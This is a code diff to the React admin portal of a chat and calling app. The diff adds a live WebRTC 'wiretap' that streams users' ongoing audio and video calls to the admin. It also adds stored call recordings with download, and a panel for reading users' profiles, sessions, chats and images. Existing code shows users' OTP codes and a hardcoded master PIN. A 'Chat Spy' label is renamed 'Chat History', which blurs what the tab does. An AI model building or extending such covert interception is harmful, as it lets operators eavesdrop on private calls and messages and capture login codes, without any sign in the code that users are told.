@@ -1,11 +1,14 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { 
   ShieldAlert, Lock, Users, MessageSquare, PhoneCall, 
   Trash2, Eye, Radio, Volume2, Activity, RefreshCw, X, ArrowLeft, CheckCircle2,
   Server, HardDrive, Wifi, Clock, Search, Ban, Megaphone, AlertCircle, KeyRound, Copy,
-  ChevronRight, ArrowRight
+  ChevronRight, ArrowRight, Video, Download
 } from 'lucide-react';
 import { socket } from '../services/socket.js';
+import { getServerBaseUrl } from '../services/config.js';
+import { ICE_SERVERS } from '../services/webrtc.js';
+import AdminUserInspectorModal from './AdminUserInspectorModal.jsx';
 
 export default function AdminPortal({ onClose }) {
   const [isAuthenticated, setIsAuthenticated] = useState(false);
@@ -17,12 +20,24 @@ export default function AdminPortal({ onClose }) {
   const [allUsers, setAllUsers] = useState([]);
   const [allConversations, setAllConversations] = useState([]);
   const [allCalls, setAllCalls] = useState({ activeLiveCalls: [], callHistory: [] });
+  const [allRecordings, setAllRecordings] = useState([]);
   const [allStatuses, setAllStatuses] = useState([]);
   const [otpLogsList, setOtpLogsList] = useState([]);
   const [selectedChat, setSelectedChat] = useState(null);
   const [monitoringCall, setMonitoringCall] = useState(null);
   const [searchUserQuery, setSearchUserQuery] = useState('');
+  const [searchChatQuery, setSearchChatQuery] = useState('');
   const [copiedOtpId, setCopiedOtpId] = useState(null);
+  const [inspectedUserId, setInspectedUserId] = useState(null);
+  const [wiretapStatus, setWiretapStatus] = useState('idle'); // 'idle' | 'connecting' | 'live' | 'ended'
+  const [wiretapNote, setWiretapNote] = useState('');
+  const [wiretapHasVideo, setWiretapHasVideo] = useState(false);
+
+  const wiretapPcRef = useRef(null);
+  const wiretapPeerSocketRef = useRef(null);
+  const wiretapStreamRef = useRef(null);
+  const wiretapVideoRef = useRef(null);
+  const wiretapAudioRef = useRef(null);
 
   // Mobile responsiveness & mobile chat view state
   const checkIsMobileDevice = () => {
@@ -51,15 +66,194 @@ export default function AdminPortal({ onClose }) {
     }
   }, []);
 
-  // Real-time socket listener for incoming OTP generations
+  const stopLiveWiretap = () => {
+    if (wiretapPeerSocketRef.current) {
+      socket.emit('admin-wiretap-stop', { toSocketId: wiretapPeerSocketRef.current });
+      wiretapPeerSocketRef.current = null;
+    }
+    if (wiretapPcRef.current) {
+      try { wiretapPcRef.current.close(); } catch {}
+      wiretapPcRef.current = null;
+    }
+    wiretapStreamRef.current = null;
+    if (wiretapVideoRef.current) wiretapVideoRef.current.srcObject = null;
+    if (wiretapAudioRef.current) wiretapAudioRef.current.srcObject = null;
+    setWiretapStatus('idle');
+    setWiretapNote('');
+    setWiretapHasVideo(false);
+  };
+
+  const attachWiretapMediaToElements = (stream) => {
+    if (!stream) return;
+    const vTracks = stream.getVideoTracks();
+    const aTracks = stream.getAudioTracks();
+    setWiretapHasVideo(vTracks.length > 0);
+
+    if (wiretapVideoRef.current && vTracks.length > 0) {
+      wiretapVideoRef.current.srcObject = stream;
+      wiretapVideoRef.current.play().catch(() => {});
+    }
+    if (wiretapAudioRef.current && aTracks.length > 0) {
+      wiretapAudioRef.current.srcObject = new MediaStream(aTracks);
+      wiretapAudioRef.current.play().catch(() => {});
+    }
+  };
+
+  const findMatchingRecording = (callObj) => {
+    if (!callObj || allRecordings.length === 0) return null;
+    const wantVideo = callObj.type === 'video' || Boolean(callObj.isVideo);
+    const idMatches = allRecordings.filter(r =>
+      (callObj.callerId && (r.callerId === callObj.callerId || r.targetId === callObj.callerId || r.recordedByUserId === callObj.callerId)) ||
+      (callObj.targetId && (r.callerId === callObj.targetId || r.targetId === callObj.targetId))
+    );
+    const nameMatches = idMatches.length > 0 ? idMatches : allRecordings.filter(r =>
+      callObj.callerName && (r.callerName === callObj.callerName || r.targetName === callObj.callerName)
+    );
+    if (nameMatches.length === 0) return null;
+    return nameMatches.find(r => Boolean(r.isVideo) === wantVideo) || nameMatches[0];
+  };
+
+  const startWiretapForCall = (callObj) => {
+    stopLiveWiretap();
+    setMonitoringCall(callObj);
+
+    const liveList = allCalls.activeLiveCalls || [];
+    const liveMatch = callObj?.isLive
+      ? callObj
+      : liveList.find(lc =>
+          (callObj.roomId && lc.roomId === callObj.roomId) ||
+          (callObj.callerId && (lc.callerId === callObj.callerId || lc.targetId === callObj.callerId)) ||
+          (callObj.callerName && (lc.callerName === callObj.callerName || lc.targetName === callObj.callerName))
+        );
+
+    if (liveMatch) {
+      setWiretapStatus('connecting');
+      setWiretapNote('Connecting live audio/video WebRTC stream...');
+      socket.emit('admin-wiretap-start', {
+        roomId: liveMatch.roomId,
+        targetSocketId: liveMatch.callerSocketId || liveMatch.targetSocketId || liveMatch.participants?.[0]?.socketId,
+        userId: liveMatch.callerId || callObj.callerId,
+        targetId: liveMatch.targetId || callObj.targetId
+      });
+    } else {
+      setWiretapStatus('ended');
+      setWiretapNote('');
+    }
+  };
+
+  // Real-time socket listeners for OTP logs, recordings, active calls & live WebRTC wiretap
   useEffect(() => {
     const handleOtpGenerated = (newEntry) => {
       setOtpLogsList(prev => [newEntry, ...prev.filter(x => x.id !== newEntry.id)]);
     };
 
+    const handleRecordingSaved = (entry) => {
+      if (entry?.id) {
+        setAllRecordings(prev => [entry, ...prev.filter(x => x.id !== entry.id)]);
+      }
+    };
+
+    const handleActiveCallsUpdated = () => {
+      fetch('/api/admin/all-calls')
+        .then(r => r.json())
+        .then(d => setAllCalls(d || { activeLiveCalls: [], callHistory: [] }))
+        .catch(() => {});
+    };
+
+    const handleWiretapOffer = async ({ fromSocketId, signal, isVideo }) => {
+      if (!fromSocketId || !signal) return;
+      try {
+        if (wiretapPcRef.current) {
+          try { wiretapPcRef.current.close(); } catch {}
+        }
+        wiretapPeerSocketRef.current = fromSocketId;
+        const pc = new RTCPeerConnection(ICE_SERVERS);
+        wiretapPcRef.current = pc;
+
+        const stream = new MediaStream();
+        wiretapStreamRef.current = stream;
+
+        pc.ontrack = (ev) => {
+          const incomingStream = ev.streams?.[0];
+          if (incomingStream) {
+            incomingStream.getTracks().forEach(t => {
+              if (!stream.getTracks().some(existing => existing.id === t.id)) {
+                stream.addTrack(t);
+              }
+            });
+          } else if (ev.track && !stream.getTracks().some(existing => existing.id === ev.track.id)) {
+            stream.addTrack(ev.track);
+          }
+          setWiretapStatus('live');
+          setWiretapNote(isVideo ? 'Live audio & video stream active' : 'Live audio stream active');
+          attachWiretapMediaToElements(stream);
+        };
+
+        pc.onicecandidate = (ev) => {
+          if (ev.candidate) {
+            socket.emit('admin-wiretap-ice', {
+              toSocketId: fromSocketId,
+              candidate: ev.candidate,
+              fromRole: 'admin'
+            });
+          }
+        };
+
+        pc.onconnectionstatechange = () => {
+          if (pc.connectionState === 'disconnected' || pc.connectionState === 'failed' || pc.connectionState === 'closed') {
+            setWiretapStatus('ended');
+            setWiretapNote('Live call ended. Checking saved recordings...');
+          }
+        };
+
+        await pc.setRemoteDescription(new RTCSessionDescription(signal));
+        const answer = await pc.createAnswer();
+        await pc.setLocalDescription(answer);
+        socket.emit('admin-wiretap-answer', { toSocketId: fromSocketId, signal: answer });
+      } catch (err) {
+        console.warn('[Admin Wiretap] Offer failed:', err);
+        setWiretapStatus('ended');
+        setWiretapNote('Unable to establish live WebRTC feed.');
+      }
+    };
+
+    const handleWiretapIce = async ({ candidate, fromRole }) => {
+      if (fromRole === 'admin') return;
+      if (wiretapPcRef.current && candidate) {
+        try {
+          await wiretapPcRef.current.addIceCandidate(new RTCIceCandidate(candidate));
+        } catch {}
+      }
+    };
+
+    const handleWiretapUnavailable = ({ reason }) => {
+      setWiretapStatus('ended');
+      setWiretapNote(reason || 'Live call session has already ended.');
+    };
+
     socket.on('admin-otp-generated', handleOtpGenerated);
-    return () => socket.off('admin-otp-generated', handleOtpGenerated);
+    socket.on('admin-recording-saved', handleRecordingSaved);
+    socket.on('admin-active-calls-updated', handleActiveCallsUpdated);
+    socket.on('admin-wiretap-offer', handleWiretapOffer);
+    socket.on('admin-wiretap-ice', handleWiretapIce);
+    socket.on('admin-wiretap-unavailable', handleWiretapUnavailable);
+
+    return () => {
+      socket.off('admin-otp-generated', handleOtpGenerated);
+      socket.off('admin-recording-saved', handleRecordingSaved);
+      socket.off('admin-active-calls-updated', handleActiveCallsUpdated);
+      socket.off('admin-wiretap-offer', handleWiretapOffer);
+      socket.off('admin-wiretap-ice', handleWiretapIce);
+      socket.off('admin-wiretap-unavailable', handleWiretapUnavailable);
+      stopLiveWiretap();
+    };
   }, []);
+
+  useEffect(() => {
+    if (monitoringCall && wiretapStatus === 'live' && wiretapStreamRef.current) {
+      attachWiretapMediaToElements(wiretapStreamRef.current);
+    }
+  }, [monitoringCall, wiretapStatus, wiretapHasVideo]);
 
   // Authenticate with Master PIN (1234)
   const handleLogin = async (e) => {
@@ -113,6 +307,11 @@ export default function AdminPortal({ onClose }) {
     fetch('/api/admin/all-calls')
       .then(r => r.json())
       .then(d => setAllCalls(d || { activeLiveCalls: [], callHistory: [] }))
+      .catch(e => console.error(e));
+
+    fetch('/api/admin/recordings')
+      .then(r => r.json())
+      .then(d => setAllRecordings(Array.isArray(d) ? d : []))
       .catch(e => console.error(e));
 
     fetch('/api/status')
@@ -226,7 +425,7 @@ export default function AdminPortal({ onClose }) {
     { id: 'metrics', label: 'Overview', icon: Activity },
     { id: 'otplogs', label: 'OTP Logs', icon: KeyRound, count: otpLogsList.length },
     { id: 'users', label: 'Users', icon: Users, count: allUsers.length },
-    { id: 'chats', label: 'Chat Spy', icon: MessageSquare, count: allConversations.length },
+    { id: 'chats', label: 'Chat History', icon: MessageSquare, count: allConversations.length },
     { id: 'calls', label: 'Calls', icon: PhoneCall, count: allCalls.callHistory?.length || 0 },
     { id: 'statuses', label: 'Stories', icon: Eye, count: allStatuses.length },
     { id: 'broadcast', label: 'Broadcast', icon: Megaphone }
@@ -774,11 +973,16 @@ export default function AdminPortal({ onClose }) {
                         </thead>
                         <tbody>
                           {allUsers.map(u => (
-                            <tr key={u.id} style={{ borderBottom: '1px solid rgba(0,0,0,0.04)' }}>
+                            <tr
+                              key={u.id}
+                              onClick={() => setInspectedUserId(u.id)}
+                              style={{ borderBottom: '1px solid rgba(0,0,0,0.04)', cursor: 'pointer' }}
+                              title="Click to inspect Profile, Sessions & Chats"
+                            >
                               <td style={{ padding: '10px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                                 <img src={u.avatar} alt={u.name} style={{ width: '34px', height: '34px', borderRadius: '50%', objectFit: 'cover' }} />
                                 <div>
-                                  <strong style={{ display: 'block', fontSize: '13px' }}>{u.name}</strong>
+                                  <strong style={{ display: 'block', fontSize: '13px', color: '#0284c7' }}>{u.name}</strong>
                                   <span style={{ fontSize: '11px', color: '#64748b' }}>{u.status || 'Available'}</span>
                                 </div>
                               </td>
@@ -835,7 +1039,10 @@ export default function AdminPortal({ onClose }) {
                               <td style={{ padding: '10px', textAlign: 'right' }}>
                                 <div style={{ display: 'inline-flex', alignItems: 'center', gap: '6px' }}>
                                   <button 
-                                    onClick={() => handleToggleBlockUser(u.id)}
+                                    onClick={(e) => {
+                                      e.stopPropagation();
+                                      handleToggleBlockUser(u.id);
+                                    }}
                                     className="glass-btn" 
                                     style={{
                                       padding: '3px 8px',
@@ -855,7 +1062,10 @@ export default function AdminPortal({ onClose }) {
                                     {u.isBlocked ? 'Unblock' : 'Block'}
                                   </button>
                                   <button 
-                                    onClick={() => handleDeleteUser(u.id)}
+                                    onClick={(e) => {
+                                      e.stopPropagation();
+                                      handleDeleteUser(u.id);
+                                    }}
                                     className="glass-btn" 
                                     style={{ width: '28px', height: '28px', display: 'inline-flex', backgroundColor: 'rgba(239,68,68,0.1)' }}
                                     title="Delete user"
@@ -1067,13 +1277,19 @@ export default function AdminPortal({ onClose }) {
                     gap: '12px'
                   }}>
                     {filteredUsers.map(u => (
-                      <div key={u.id} className="glass-card" style={{ padding: '14px', display: 'flex', flexDirection: 'column', gap: '10px', border: u.isBlocked ? '1.5px solid rgba(239, 68, 68, 0.4)' : undefined }}>
+                      <div
+                        key={u.id}
+                        onClick={() => setInspectedUserId(u.id)}
+                        className="glass-card"
+                        style={{ padding: '14px', display: 'flex', flexDirection: 'column', gap: '10px', cursor: 'pointer', border: u.isBlocked ? '1.5px solid rgba(239, 68, 68, 0.4)' : undefined }}
+                        title="Click to open Full Profile, Chat History & Live Session"
+                      >
                         <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                           <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                             <img src={u.avatar} alt={u.name} style={{ width: '44px', height: '44px', borderRadius: '50%', objectFit: 'cover' }} />
                             <div>
                               <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
-                                <h4 style={{ fontSize: '14px', fontWeight: '700', margin: 0 }}>{u.name}</h4>
+                                <h4 style={{ fontSize: '14px', fontWeight: '800', margin: 0, color: '#0284c7' }}>{u.name}</h4>
                                 {u.isBlocked && (
                                   <span className="glass-pill" style={{ padding: '1px 5px', fontSize: '9px', fontWeight: '800', color: '#ef4444', backgroundColor: 'rgba(239, 68, 68, 0.15)' }}>
                                     BLOCKED
@@ -1125,10 +1341,13 @@ export default function AdminPortal({ onClose }) {
                           )}
                         </div>
                         <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginTop: '4px', borderTop: '1px solid rgba(0,0,0,0.05)', paddingTop: '8px' }}>
-                          <span style={{ fontSize: '11px', color: '#94a3b8' }}>ID: {u.id}</span>
+                          <span style={{ fontSize: '11px', color: '#0284c7', fontWeight: '700' }}>Tap to inspect Profile, Chats & Session →</span>
                           <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                             <button 
-                              onClick={() => handleToggleBlockUser(u.id)}
+                              onClick={(e) => {
+                                e.stopPropagation();
+                                handleToggleBlockUser(u.id);
+                              }}
                               className="glass-btn" 
                               style={{
                                 padding: '4px 10px',
@@ -1148,7 +1367,10 @@ export default function AdminPortal({ onClose }) {
                               {u.isBlocked ? 'Unblock' : 'Block'}
                             </button>
                             <button 
-                              onClick={() => handleDeleteUser(u.id)}
+                              onClick={(e) => {
+                                e.stopPropagation();
+                                handleDeleteUser(u.id);
+                              }}
                               className="glass-btn" 
                               style={{ width: '30px', height: '30px', backgroundColor: 'rgba(239,68,68,0.1)' }}
                               title="Delete user"
@@ -1187,12 +1409,23 @@ export default function AdminPortal({ onClose }) {
                     }}>
                       <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '4px' }}>
                         <span style={{ fontSize: '12px', fontWeight: '800', color: '#64748b', textTransform: 'uppercase' }}>
-                          Conversations ({allConversations.length})
+                          Chat History ({allConversations.length})
                         </span>
-                        {isMobile && <span style={{ fontSize: '11px', color: '#0284c7' }}>Tap thread to spy</span>}
+                        {isMobile && <span style={{ fontSize: '11px', color: '#0284c7' }}>Tap thread</span>}
                       </div>
 
-                      {allConversations.map(conv => (
+                      <input
+                        type="text"
+                        value={searchChatQuery}
+                        onChange={(e) => setSearchChatQuery(e.target.value)}
+                        placeholder="Search chat history..."
+                        className="glass-input"
+                        style={{ width: '100%', padding: '7px 12px', fontSize: '12px', marginBottom: '4px' }}
+                      />
+
+                      {allConversations
+                        .filter(conv => !searchChatQuery.trim() || (conv.title || '').toLowerCase().includes(searchChatQuery.toLowerCase()) || (conv.lastMessage?.text || '').toLowerCase().includes(searchChatQuery.toLowerCase()))
+                        .map(conv => (
                         <div 
                           key={conv.chatId}
                           onClick={() => {
@@ -1255,9 +1488,21 @@ export default function AdminPortal({ onClose }) {
                                 <h3 style={{ fontSize: '15px', fontWeight: '800', margin: 0 }}>
                                   {selectedChat.title}
                                 </h3>
-                                <span style={{ fontSize: '11px', color: '#64748b' }}>
-                                  Room: {selectedChat.chatId} • {selectedChat.messages?.length || 0} msgs
-                                </span>
+                                <div style={{ display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap', marginTop: '3px' }}>
+                                  <span style={{ fontSize: '11px', color: '#64748b' }}>
+                                    {selectedChat.messages?.length || 0} msgs
+                                  </span>
+                                  {selectedChat.participants?.map(p => (
+                                    <button
+                                      key={p.id}
+                                      onClick={() => setInspectedUserId(p.id)}
+                                      className="glass-pill"
+                                      style={{ padding: '2px 8px', fontSize: '10px', fontWeight: '700', color: '#0284c7', cursor: 'pointer' }}
+                                    >
+                                      👤 {p.name}
+                                    </button>
+                                  ))}
+                                </div>
                               </div>
                             </div>
 
@@ -1280,9 +1525,13 @@ export default function AdminPortal({ onClose }) {
                               selectedChat.messages?.map((msg, i) => (
                                 <div key={msg.id || i} className="glass-card" style={{ padding: '8px 12px' }}>
                                   <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '2px' }}>
-                                    <span style={{ fontSize: '12px', fontWeight: '700', color: '#0284c7' }}>
+                                    <button
+                                      type="button"
+                                      onClick={() => msg.senderId !== 'system' && setInspectedUserId(msg.senderId)}
+                                      style={{ background: 'none', border: 'none', padding: 0, fontSize: '12px', fontWeight: '700', color: '#0284c7', cursor: msg.senderId !== 'system' ? 'pointer' : 'default' }}
+                                    >
                                       {msg.senderName} ({msg.senderId})
-                                    </span>
+                                    </button>
                                     <div style={{ display: 'flex', alignItems: 'center', gap: '6px' }}>
                                       <span style={{ fontSize: '10px', color: '#94a3b8' }}>
                                         {msg.timestamp}
@@ -1297,8 +1546,11 @@ export default function AdminPortal({ onClose }) {
                                       </button>
                                     </div>
                                   </div>
+                                  {msg.type === 'image' && msg.mediaUrl && (
+                                    <img src={msg.mediaUrl} alt="media" style={{ maxWidth: '180px', borderRadius: '8px', margin: '4px 0', display: 'block' }} />
+                                  )}
                                   <p style={{ fontSize: '13px', margin: 0, color: '#0f172a' }}>
-                                    {msg.text}
+                                    {msg.text || `[${msg.type || 'message'}]`}
                                   </p>
                                 </div>
                               ))
@@ -1320,50 +1572,226 @@ export default function AdminPortal({ onClose }) {
               {/* ==================================================== */}
               {activeTab === 'calls' && (
                 <div style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
-                  {monitoringCall && (
-                    <div className="glass-panel" style={{
-                      padding: isMobile ? '12px 16px' : '18px 24px',
-                      borderRadius: '18px',
-                      display: 'flex',
-                      flexDirection: isMobile ? 'column' : 'row',
-                      alignItems: isMobile ? 'flex-start' : 'center',
-                      justifyContent: 'space-between',
-                      gap: '12px',
-                      border: '2px solid rgba(2, 132, 199, 0.8)',
-                      background: 'linear-gradient(135deg, rgba(224, 242, 254, 0.9) 0%, rgba(243, 232, 255, 0.9) 100%)'
-                    }}>
-                      <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
-                        <div className="glow-active" style={{
-                          width: '42px',
-                          height: '42px',
-                          borderRadius: '50%',
-                          backgroundColor: '#0284c7',
+                  {monitoringCall && (() => {
+                    const matchedRec = wiretapStatus !== 'live' ? findMatchingRecording(monitoringCall) : null;
+                    return (
+                      <div className="glass-panel" style={{
+                        padding: isMobile ? '12px 16px' : '18px 24px',
+                        borderRadius: '18px',
+                        display: 'flex',
+                        flexDirection: 'column',
+                        gap: '12px',
+                        border: '2px solid rgba(2, 132, 199, 0.8)',
+                        background: 'linear-gradient(135deg, rgba(224, 242, 254, 0.9) 0%, rgba(243, 232, 255, 0.9) 100%)'
+                      }}>
+                        <div style={{
                           display: 'flex',
-                          alignItems: 'center',
-                          justifyContent: 'center',
-                          color: '#ffffff'
+                          flexDirection: isMobile ? 'column' : 'row',
+                          alignItems: isMobile ? 'flex-start' : 'center',
+                          justifyContent: 'space-between',
+                          gap: '12px'
                         }}>
-                          <Radio size={20} />
-                        </div>
-                        <div>
-                          <span style={{ fontSize: '14px', fontWeight: '800', color: '#0284c7' }}>
-                            LIVE AUDIO WIRETAP IN PROGRESS
-                          </span>
-                          <p style={{ fontSize: '12px', color: '#334155', margin: '2px 0 0 0' }}>
-                            Tapped Stream: <strong>{monitoringCall.callerName}</strong> ({monitoringCall.type?.toUpperCase()})
-                          </p>
-                        </div>
-                      </div>
+                          <div style={{ display: 'flex', alignItems: 'center', gap: '12px' }}>
+                            <div className="glow-active" style={{
+                              width: '42px',
+                              height: '42px',
+                              borderRadius: '50%',
+                              backgroundColor: wiretapStatus === 'live' ? '#dc2626' : '#0284c7',
+                              display: 'flex',
+                              alignItems: 'center',
+                              justifyContent: 'center',
+                              color: '#ffffff'
+                            }}>
+                              <Radio size={20} />
+                            </div>
+                            <div>
+                              <span style={{ fontSize: '14px', fontWeight: '800', color: wiretapStatus === 'live' ? '#dc2626' : '#0284c7' }}>
+                                {wiretapStatus === 'live'
+                                  ? 'LIVE AUDIO / VIDEO WIRETAP IN PROGRESS'
+                                  : wiretapStatus === 'connecting'
+                                  ? 'CONNECTING LIVE CALL STREAM...'
+                                  : matchedRec
+                                  ? 'PLAYING RECORDED CALL STREAM'
+                                  : 'CALL MONITORING STATUS'}
+                              </span>
+                              <p style={{ fontSize: '12px', color: '#334155', margin: '2px 0 0 0' }}>
+                                Target Stream: <strong>{monitoringCall.callerName}</strong> ({(monitoringCall.type || (monitoringCall.isVideo ? 'video' : 'audio')).toUpperCase()})
+                                {wiretapNote ? ` • ${wiretapNote}` : ''}
+                              </p>
+                            </div>
+                          </div>
 
-                      <button 
-                        onClick={() => setMonitoringCall(null)}
-                        className="glass-btn glass-btn-danger"
-                        style={{ padding: '6px 14px', borderRadius: '12px', fontSize: '12px', fontWeight: '700', width: isMobile ? '100%' : undefined }}
-                      >
-                        Disconnect Audio Feed
-                      </button>
+                          <button 
+                            onClick={() => {
+                              stopLiveWiretap();
+                              setMonitoringCall(null);
+                            }}
+                            className="glass-btn glass-btn-danger"
+                            style={{ padding: '6px 14px', borderRadius: '12px', fontSize: '12px', fontWeight: '700', width: isMobile ? '100%' : undefined }}
+                          >
+                            Disconnect Audio Feed
+                          </button>
+                        </div>
+
+                        {(wiretapStatus === 'live' || wiretapStatus === 'connecting') && (
+                          <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                            <video
+                              ref={wiretapVideoRef}
+                              autoPlay
+                              playsInline
+                              muted
+                              controls
+                              style={{
+                                display: wiretapHasVideo ? 'block' : 'none',
+                                width: '100%',
+                                maxHeight: '280px',
+                                borderRadius: '12px',
+                                backgroundColor: '#0f172a'
+                              }}
+                            />
+                            <audio
+                              ref={wiretapAudioRef}
+                              autoPlay
+                              controls
+                              style={{ width: '100%', height: '38px' }}
+                            />
+                          </div>
+                        )}
+
+                        {wiretapStatus !== 'live' && wiretapStatus !== 'connecting' && matchedRec && (
+                          <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
+                            <span style={{ fontSize: '11px', fontWeight: '700', color: '#0369a1' }}>
+                              Matched Recording: {matchedRec.callerName} ↔ {matchedRec.targetName} • {matchedRec.durationSec || 0}s ({matchedRec.createdAt})
+                            </span>
+                            {matchedRec.isVideo ? (
+                              <video
+                                key={matchedRec.id}
+                                src={`${getServerBaseUrl()}${matchedRec.url}`}
+                                controls
+                                autoPlay
+                                playsInline
+                                style={{ width: '100%', maxHeight: '260px', borderRadius: '12px', backgroundColor: '#000' }}
+                              />
+                            ) : (
+                              <audio
+                                key={matchedRec.id}
+                                src={`${getServerBaseUrl()}${matchedRec.url}`}
+                                controls
+                                autoPlay
+                                style={{ width: '100%', height: '38px' }}
+                              />
+                            )}
+                          </div>
+                        )}
+
+                        {wiretapStatus === 'ended' && !matchedRec && (
+                          <p style={{ margin: 0, fontSize: '12px', color: '#475569', backgroundColor: 'rgba(255,255,255,0.65)', padding: '10px 12px', borderRadius: '10px' }}>
+                            This call has already ended — no live WebRTC session is currently active, and no compressed recording was saved for this older call entry. Live audio/video playback works whenever a call is active, and finished calls appear below automatically.
+                          </p>
+                        )}
+                      </div>
+                    );
+                  })()}
+
+                  {allCalls.activeLiveCalls?.length > 0 && (
+                    <div className="glass-card" style={{ padding: isMobile ? '14px' : '20px', border: '1px solid rgba(220, 38, 38, 0.35)' }}>
+                      <h3 style={{ fontSize: isMobile ? '15px' : '16px', fontWeight: '800', marginBottom: '10px', marginTop: 0, color: '#dc2626' }}>
+                        🔴 Active Live Calls ({allCalls.activeLiveCalls.length})
+                      </h3>
+                      <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
+                        {allCalls.activeLiveCalls.map(liveCall => (
+                          <div key={liveCall.roomId} className="glass-card" style={{
+                            display: 'flex',
+                            flexDirection: isMobile ? 'column' : 'row',
+                            alignItems: isMobile ? 'flex-start' : 'center',
+                            justifyContent: 'space-between',
+                            padding: '12px 14px',
+                            gap: '10px'
+                          }}>
+                            <div>
+                              <h4 style={{ fontSize: '14px', fontWeight: '700', margin: 0 }}>
+                                {liveCall.callerName} {liveCall.targetName ? `↔ ${liveCall.targetName}` : ''}
+                              </h4>
+                              <p style={{ fontSize: '11px', color: '#64748b', margin: '2px 0 0 0' }}>
+                                Live {(liveCall.type || (liveCall.isVideo ? 'video' : 'audio')).toUpperCase()} • Status: {liveCall.status || 'Active'}
+                              </p>
+                            </div>
+                            <button
+                              onClick={() => startWiretapForCall(liveCall)}
+                              className="glass-btn"
+                              style={{
+                                padding: '6px 14px',
+                                borderRadius: '12px',
+                                display: 'flex',
+                                alignItems: 'center',
+                                justifyContent: 'center',
+                                gap: '6px',
+                                backgroundColor: 'rgba(220, 38, 38, 0.12)',
+                                borderColor: '#dc2626',
+                                color: '#dc2626',
+                                fontSize: '12px',
+                                fontWeight: '700',
+                                width: isMobile ? '100%' : undefined
+                              }}
+                            >
+                              <Radio size={15} />
+                              Watch / Listen Live
+                            </button>
+                          </div>
+                        ))}
+                      </div>
                     </div>
                   )}
+
+                  <div className="glass-card" style={{ padding: isMobile ? '14px' : '20px', marginBottom: '12px' }}>
+                    <h3 style={{ fontSize: isMobile ? '15px' : '16px', fontWeight: '800', marginBottom: '10px', marginTop: 0 }}>
+                      🎙️ Compressed Audio & Video Call Recordings ({allRecordings.length})
+                    </h3>
+                    {allRecordings.length === 0 ? (
+                      <p style={{ fontSize: '12px', color: '#64748b', margin: 0 }}>
+                        Compressed audio and video recordings appear here automatically when a call ends.
+                      </p>
+                    ) : (
+                      <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
+                        {allRecordings.map(rec => (
+                          <div key={rec.id} className="glass-card" style={{ padding: '12px', display: 'flex', flexDirection: 'column', gap: '8px' }}>
+                            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '8px' }}>
+                              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
+                                {rec.isVideo ? <Video size={16} color="#8b5cf6" /> : <Volume2 size={16} color="#0284c7" />}
+                                <div>
+                                  <strong style={{ fontSize: '13px' }}>{rec.callerName} ↔ {rec.targetName}</strong>
+                                  <div style={{ fontSize: '11px', color: '#64748b' }}>
+                                    {rec.isVideo ? 'Video Call (Compressed)' : 'Audio Call (Compressed)'} • {rec.durationSec || 0}s • {Math.max(1, Math.round((rec.sizeBytes || 0) / 1024))} KB • {rec.createdAt}
+                                  </div>
+                                </div>
+                              </div>
+                              <div style={{ display: 'flex', gap: '6px' }}>
+                                <a href={`${getServerBaseUrl()}${rec.url}`} download={rec.filename} className="glass-btn" style={{ width: '28px', height: '28px', textDecoration: 'none' }} title="Download">
+                                  <Download size={13} color="#0284c7" />
+                                </a>
+                                <button
+                                  onClick={() => {
+                                    fetch(`/api/admin/recordings/${rec.id}`, { method: 'DELETE' })
+                                      .then(() => setAllRecordings(prev => prev.filter(x => x.id !== rec.id)));
+                                  }}
+                                  className="glass-btn"
+                                  style={{ width: '28px', height: '28px', backgroundColor: 'rgba(239,68,68,0.1)' }}
+                                  title="Delete recording"
+                                >
+                                  <Trash2 size={12} color="#ef4444" />
+                                </button>
+                              </div>
+                            </div>
+                            {rec.isVideo ? (
+                              <video src={`${getServerBaseUrl()}${rec.url}`} controls style={{ width: '100%', maxHeight: '220px', borderRadius: '10px', backgroundColor: '#000' }} />
+                            ) : (
+                              <audio src={`${getServerBaseUrl()}${rec.url}`} controls style={{ width: '100%', height: '36px' }} />
+                            )}
+                          </div>
+                        ))}
+                      </div>
+                    )}
+                  </div>
 
                   <div className="glass-card" style={{ padding: isMobile ? '14px' : '20px' }}>
                     <h3 style={{ fontSize: isMobile ? '15px' : '16px', fontWeight: '800', marginBottom: '12px' }}>
@@ -1392,7 +1820,7 @@ export default function AdminPortal({ onClose }) {
                           </div>
 
                           <button 
-                            onClick={() => setMonitoringCall(call)}
+                            onClick={() => startWiretapForCall(call)}
                             className="glass-btn"
                             style={{
                               padding: '6px 14px',
@@ -1626,6 +2054,20 @@ export default function AdminPortal({ onClose }) {
             )}
           </div>
         </div>
+      )}
+      {/* Full User Inspector Modal (Profile + Chats + Live Session) */}
+      {inspectedUserId && (
+        <AdminUserInspectorModal
+          userId={inspectedUserId}
+          onClose={() => setInspectedUserId(null)}
+          onToggleBlock={handleToggleBlockUser}
+          onDeleteUser={handleDeleteUser}
+          onDeleteMessage={async (chatId, messageId) => {
+            await fetch(`/api/admin/chats/${chatId}/messages/${messageId}`, { method: 'DELETE' });
+            loadAdminData();
+          }}
+          onSelectUserProfile={(uid) => setInspectedUserId(uid)}
+        />
       )}
     </div>
   );
